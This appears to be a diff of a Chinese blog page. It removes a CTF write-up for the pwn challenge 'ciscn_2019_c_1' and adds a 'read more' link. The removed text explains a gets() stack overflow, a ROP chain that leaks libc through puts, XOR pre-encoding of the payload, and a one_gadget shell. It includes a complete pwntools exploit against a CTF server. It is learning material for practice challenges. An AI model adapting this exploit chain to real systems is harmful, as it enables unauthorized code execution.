@@ -248,79 +248,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-前情提要"><a href="#0x00-前情提要" class="headerlink" title="0x00 前情提要"></a>0x00 前情提要</h2><p>这道题做着挺好玩的，对于我这个菜鸟来说，可以锻炼很多方面的能力。</p>
+              <h2 id="0x00-前情提要"><a href="#0x00-前情提要" class="headerlink" title="0x00 前情提要"></a>0x00 前情提要</h2><p>这道题做着挺好玩的，对于我这个菜鸟来说，可以锻炼很多方面的能力。</p>
 <p>这道题是一个ROP类型的题目，但是也没有这么轻易给你ROP。需要分析，并且巧妙的做一些事情。</p>
-<h2 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h2><h3 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1 - checksec"></a>1 - checksec</h3><p>当然第一步还是雷打不动的先checksec一下，养成良好的习惯。</p>
-<p>发现这个题只有NX enabled，说明显然不能写shellcode来做。</p>
-<h3 id="2-康康洞在哪里"><a href="#2-康康洞在哪里" class="headerlink" title="2 - 康康洞在哪里"></a>2 - 康康洞在哪里</h3><p> <del>想知道洞在哪，为什么不问问神奇的F5呢</del> 扔进IDA里面然后康康神奇的F5能给我们什么帮助。</p>
-<p>首先在main函数中，好像看不出什么东西来，一切都很正常。</p>
-<p>不过可以知道的一点是，这个函数的功能是加密，然后解密的算法没有提供。</p>
-<p>于是自然而然的，我们就会被诱拐去康康加密函数<code>encryptp</code>里面有什么东西。</p>
-<p><img src="/2021/09/01/ciscn_2019_c_1-wp/image-20210901141859134.png" alt="image-20210901141859134"></p>
-<p>从上图可以看到，很明显有个<code>gets(s)</code>操作，标准的栈溢出。</p>
-<p>然后我们回顾一下上面 checksec的结果：</p>
-<ul>
-<li>首先栈溢出不能做 shellcode了，因为 NX enabled。</li>
-<li>然后由于没有后门函数，所以不能 ret2text。</li>
-<li>那么基本上可以断定，我们这个地方，基本上是要用栈溢出做ROP了。</li>
-</ul>
-<p>有了上面的分析，那么我们就可以思考一下，怎么做ROP呢？它的gadget哪里来？</p>
-<p>可惜天公不作美：</p>
-<ul>
-<li><p>如果要从本程序来找ROP gadget，没有足够的gadget可以构造出拿 shell 的语句。（<strong>当然一般来说，用本程序的gadget来构造基本上都是不行的</strong>）</p>
-</li>
-<li><p>如果从 libc 找 gadget，拿我们没有 libc 的基址，还是很难做。</p>
-</li>
-</ul>
-<p>那么分析了不美的天公之后，我们基本上也只有一个选择，<strong>康康能不能 leak 出 libc 基址</strong></p>
-<h2 id="0x02-leak-libc-的基址"><a href="#0x02-leak-libc-的基址" class="headerlink" title="0x02 leak libc 的基址"></a>0x02 leak libc 的基址</h2><p>一般来说，想要leak libc 的基址，我们就要<strong>把目光转向got表当中</strong>。</p>
-<p>由于程序没有现成给我们的后门可以输出任意地址的内容，那我们只能另辟蹊径。</p>
-<p>突然我们想到，我们首先可以栈溢出的洞来控制程序流程，然后我们又想要输出任意地址的内容，然后我们本程序当中还有pop rdi 的gadget，这是不是说明，我们可以控制程序流程来完成这样一件事情：</p>
-<p>先把某个got表的地址pop到rdi中，然后 ret 转向puts函数，这样不就能输出got的内容，进而拿到libc的基址了么。</p>
-<p>没错这个想法确实是可行的。</p>
-<p>那么现在又有了新的问题，怎么绕过加密？</p>
-<h2 id="0x03-加密的地方怎么办"><a href="#0x03-加密的地方怎么办" class="headerlink" title="0x03 加密的地方怎么办"></a>0x03 加密的地方怎么办</h2><p>为了解决加密的问题，那我们康康这个加密的地方是怎么加密的。</p>
-<p>很明显，加密的时候是进行异或操作，因此加解密显然是相同的操作。</p>
-<p>因此，如果我们输入的时候，就输入已经加密过一次的数据，那程序再对其加密一次就相当于进行了解密操作。</p>
-<p>所以有了这个思路我们就可以构思我们的payload了。</p>
-<p>首先，需要填充到返回地址部分，然后控制流程实现输出got表的内容（当然最后还要再回到这个漏洞的地方，因为第一次只是leak libc，后面执行one_gadget 或者是ROP都需要再次栈溢出）</p>
-<p>具体payload长下面这样：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line"><span class="comment">#rop gadget</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x400c83</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">p += <span class="string">&#x27;b&#x27;</span></span><br><span class="line">p += pop_rdi <span class="comment">#将got表地址当成第一个参数</span></span><br><span class="line">p += p64(elf.got[<span class="string">&quot;puts&quot;</span>]) <span class="comment">#写入puts的got表地址</span></span><br><span class="line">p += p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) <span class="comment">#调用puts函数，并以puts的got为第一参数</span></span><br><span class="line">p += p64(main_addr) <span class="comment">#最后回到main函数，为了再次栈溢出</span></span><br></pre></td></tr></table></figure>
-
-<p>然后有了上述的payload之后，我们就可以对这个内容提前进行加密了。</p>
-<p>仿照函数中的操作，用python也重新实现了一边，具体如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">change_p = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">ord</span>(i)&lt;= <span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i)&gt; <span class="number">122</span>):</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">ord</span>(i) &lt;= <span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &gt;<span class="number">90</span>):</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">ord</span>(i)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">57</span>):</span><br><span class="line">				i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xF</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xE</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xD</span>)</span><br><span class="line">	change_p += i</span><br></pre></td></tr></table></figure>
-
-<p>最终的payload就存在了change_p当中。</p>
-<p>这样当我们把change_p的内容发过去之后，程序会再对其进行加密，也就使得其回到最开始payload的样子，我们就能成功地收到got的地址了。</p>
-<h2 id="0x04-再来一次栈溢出"><a href="#0x04-再来一次栈溢出" class="headerlink" title="0x04 再来一次栈溢出"></a>0x04 再来一次栈溢出</h2><p>到目前为止，我们都还只是leak 了 libc，然后我们最重要的目的是拿shell啊，所以显然我们还需要再次控制流程。这也是我们拿libc基址所想要干的事情。</p>
-<p>因为懒，所以我就先尝试one_gadget能不能做。</p>
-<p>然后我们需要找到对应版本的libc（直接先打到服务器那边去，然后康康leak出来的puts的libc地址是多少，然后libc search一下就能找出来对应的版本了。）</p>
-<p>有了对应的版本，我们就来试试one_gadget能不能用。</p>
-<p>结果测试得到，第二个one_gadget是可以用的。</p>
-<p>因此我们写下如下的payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&quot;a&quot;</span> * <span class="number">0x58</span></span><br><span class="line">p += p64(one_gadget + libc_base)</span><br></pre></td></tr></table></figure>
-
-<p>然后就成功拿到shell了（当然如果是在本地测试，你最终链接的libc得对才能在本地拿到shell）</p>
-<h2 id="0x05-exp长这样"><a href="#0x05-exp长这样" class="headerlink" title="0x05 exp长这样"></a>0x05 exp长这样</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="string">&quot;26805&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.27-3ubuntu1_amd64.so&quot;</span>) <span class="comment"># 需要找到服务器上正确的libc版本</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_c_1&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop gadget</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x400c83</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">one_gadget = <span class="number">0x4f322</span><span class="comment">#0x4f432 #one gadget 的地址是需要位正确版本libc中的地址</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ted\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">p += <span class="string">&#x27;b&#x27;</span></span><br><span class="line">p += pop_rdi</span><br><span class="line">p += p64(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">p += p64(elf.plt[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">p += p64(main_addr)</span><br><span class="line"></span><br><span class="line">change_p = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">ord</span>(i)&lt;= <span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i)&gt; <span class="number">122</span>):</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">ord</span>(i) &lt;= <span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(i) &gt;<span class="number">90</span>):</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">ord</span>(i)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">57</span>):</span><br><span class="line">				i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xF</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xE</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		i = <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">0xD</span>)</span><br><span class="line">	change_p += i</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.send(change_p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;a&quot;</span> * <span class="number">0x58</span></span><br><span class="line">p += p64(one_gadget + libc_base)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;ted\n&quot;</span>)</span><br><span class="line">r.send(p+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&quot;cat flag\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;b *0x400ADF&quot;)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x06-其实还有小问题"><a href="#0x06-其实还有小问题" class="headerlink" title="0x06 其实还有小问题"></a>0x06 其实还有小问题</h2><p>这个地方如果按照我上面写的步骤来写exp是肯定能过的，但是其实还有给小问题没有提。</p>
-<p>仔细去比较两次栈溢出的payload你就会发现，我第一次加密了一下，第二次就没有加密，那为什么第二次可以过呢？地址被加密了不久不一样了么？</p>
-<p>那为了解决这个疑惑，我们再来看看原来的程序长什么样</p>
-<p><img src="/2021/09/01/ciscn_2019_c_1-wp/image-20210901145811696.png" alt="image-20210901145811696"></p>
-<p>从上图中我们可以看到，控制加密这个程序流程的变量是这个<code>x</code>。</p>
-<p>并且这个<code>x</code>是个<strong>全局变量</strong>。</p>
-<p>想到这里，基本上就有眉目了吧。</p>
-<p>因为第一次加密的时候，我们的<code>x</code>已经累加过了，并且它是全局变量，所以它在执行第二次加密的时候，是不会重新变为0，也就是还是第一次结束后的值。</p>
-<p>那我们显然程序第一次加密的payload比第二次长，所以第二次一进来，<code>v0</code>的值就一定大于<code>strlen(s)</code>了，所以就直接<code>break</code>了，因此第二次没有加密。</p>
-<p>如果第二次我们还是对payload先进行一次加密再发送过来，那程序才是真的会出错。</p>
-<h2 id="0x07-小结"><a href="#0x07-小结" class="headerlink" title="0x07 小结"></a>0x07 小结</h2><p>这个题目对于我这个菜鸟来说，又能学到很多，这个ROP的过程没有这么直接，不是直接去拿shell，而是通过ROP先leak libc，然后再one_gadget去拿shell，并且对这个加密的分析也锻炼了分析程序的能力（尤其是需要分析出，第一次需要先对payload加密，再发送到程序中，而第二次却不用）</p>
-<h2 id="0x-最后一段用于查找md源文件以便修改"><a href="#0x-最后一段用于查找md源文件以便修改" class="headerlink" title="0x?? 最后一段用于查找md源文件以便修改"></a>0x?? 最后一段用于查找md源文件以便修改</h2><blockquote>
-<p>//文档查找：ciscn_2019_c_1-wp.md</p>
-</blockquote>
-
+          
       
       
     </div>
@@ -338,6 +268,10 @@
         <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-pwn/" rel="tag">ctf-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2021/09/01/ciscn_2019_c_1-wp/#more">让我康康 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
